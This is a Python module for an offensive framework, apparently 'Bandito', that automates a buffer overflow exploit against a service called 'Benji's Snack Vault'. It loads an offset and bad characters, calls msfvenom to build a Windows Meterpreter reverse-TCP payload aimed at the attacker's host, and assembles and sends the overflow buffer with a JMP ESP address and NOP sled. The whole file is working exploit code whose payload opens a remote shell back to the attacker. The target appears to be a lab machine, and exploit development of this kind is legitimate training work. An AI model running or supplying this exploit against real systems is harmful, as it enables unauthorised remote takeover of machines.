"""
modules/buffer_overflow/benjis_snack_vault_bo.py
Automated buffer overflow exploit:
  - Auto-loads offset + badchars from analysis_results.json
  - Generates Meterpreter payload via msfvenom
  - Sends full exploit buffer
"""

import json
import socket
import struct
import subprocess
from base_module import BaseModule
from utils import colored


class BenjisSnackVaultBO(BaseModule):
    def __init__(self):
        super().__init__()
        self.name        = "benjis_snack_vault_bo"
        self.description = "Automated BoF exploit — loads analysis results + generates Meterpreter payload"

        self.options = {
            "RHOST":        {"value": "192.168.107.132", "required": True,  "description": "Target IP"},
            "RPORT":        {"value": 9999,              "required": True,  "description": "Target port"},
            "LHOST":        {"value": "",                "required": True,  "description": "Your Kali IP (reverse shell)"},
            "LPORT":        {"value": 4444,              "required": True,  "description": "Listener port"},
            "PREFIX":       {"value": "MEOW ",           "required": True,  "description": "Command prefix (must match analysis module)"},
            "PAYLOAD_FILE": {"value": "meterpreter.bin", "required": False, "description": "Output path for msfvenom payload"},
        }

        self._results_file = "analysis_results.json"

    # ------------------------------------------------------------------
    # Help
    # ------------------------------------------------------------------
    def show_help(self):
        print(colored("\n=== Automated BoF Exploit Module ===", "orange"))
        print(self.description)
        print("\nWorkflow:")
        print("  1. Run analysis module first to generate analysis_results.json")
        print("  2. set LHOST <your_kali_ip>")
        print("  3. run → generates payload + sends exploit")
        print("\nCommands:")
        print("  run / exploit        - Generate payload and fire exploit")
        print("  set <option> <value> - Set an option")
        print("  show options         - Show current settings")
        print("  back / exit          - Return to framework\n")

    # ------------------------------------------------------------------
    # Command dispatcher
    # ------------------------------------------------------------------
    def handle_command(self, cmd_input: str):
        cmd = cmd_input.strip()
        low = cmd.lower()

        if low in ["help", "show options"]:
            self.show_options()
            self.show_help()
            return

        if low.startswith("set "):
            parts = cmd.split(maxsplit=2)
            if len(parts) == 3:
                self.set_option(parts[1], parts[2])
            else:
                print("Usage: set <option> <value>")
            return

        if low in ["run", "exploit"]:
            self.run()
            return

        if low in ["back", "exit", "quit"]:
            print(colored("[*] Returning to Bandito framework...", "yellow"))
            return

        print(colored(f"[-] Unknown command: {cmd}", "red"))
        print("Type 'help' for available commands.")

    # ------------------------------------------------------------------
    # run()
    # ------------------------------------------------------------------
    def run(self):
        # --- Load analysis results ---
        offset   = 1731                      # sensible defaults
        badchars = "\\x00\\x09\\x0a\\x0d"
        prefix   = self.options["PREFIX"]["value"]

        try:
            with open(self._results_file) as fh:
                data = json.load(fh)
            offset   = data.get("OFFSET",   offset)
            badchars = data.get("BADCHARS", badchars)
            prefix   = data.get("PREFIX",   prefix)
            # Sync PREFIX option so show_options reflects loaded value
            self.options["PREFIX"]["value"] = prefix
            print(colored(f"[+] Loaded analysis_results.json  (OFFSET={offset})", "green"))
        except FileNotFoundError:
            print(colored("[-] analysis_results.json not found — using defaults.", "yellow"))
        except Exception as exc:
            print(colored(f"[-] Could not parse analysis_results.json: {exc}", "yellow"))

        lhost = self.options["LHOST"]["value"]
        if not lhost:
            lhost = input(colored("Enter your Kali IP (LHOST): ", "yellow")).strip()
            self.options["LHOST"]["value"] = lhost

        lport        = str(self.options["LPORT"]["value"])
        payload_file = self.options["PAYLOAD_FILE"]["value"]

        # --- Generate shellcode ---
        print(colored("[*] Generating Meterpreter payload with msfvenom ...", "yellow"))
        try:
            subprocess.run([
                "msfvenom",
                "-p", "windows/meterpreter/reverse_tcp",
                f"LHOST={lhost}", f"LPORT={lport}",
                "EXITFUNC=thread",
                "-b", badchars,
                "-f", "raw",
                "-o", payload_file,
            ], check=True)
            print(colored(f"[+] Payload saved to {payload_file}", "green"))
        except Exception as exc:
            print(colored(f"[-] msfvenom failed: {exc}", "red"))
            return

        # --- Read shellcode ---
        try:
            with open(payload_file, "rb") as fh:
                shellcode = fh.read()
        except Exception as exc:
            print(colored(f"[-] Could not read payload file: {exc}", "red"))
            return

        # --- Build buffer ---
        junk   = b"A" * offset
        ret    = struct.pack("<I", 0x114015F3)   # JMP ESP — update per target
        nops   = b"\x90" * 200
        buffer = prefix.encode() + junk + ret + nops + shellcode + b"\r\n"

        # --- Send exploit ---
        rhost = self.options["RHOST"]["value"]
        rport = int(self.options["RPORT"]["value"])
        print(colored(f"[*] Sending {len(buffer)}-byte exploit to {rhost}:{rport} ...", "yellow"))

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((rhost, rport))
            s.send(buffer)
            s.close()
            print(colored("[+] Exploit sent!", "green"))
            print(colored("    Start your Metasploit handler and wait for the Meterpreter session.", "yellow"))
        except Exception as exc:
            print(colored(f"[-] Send failed: {exc}", "red"))
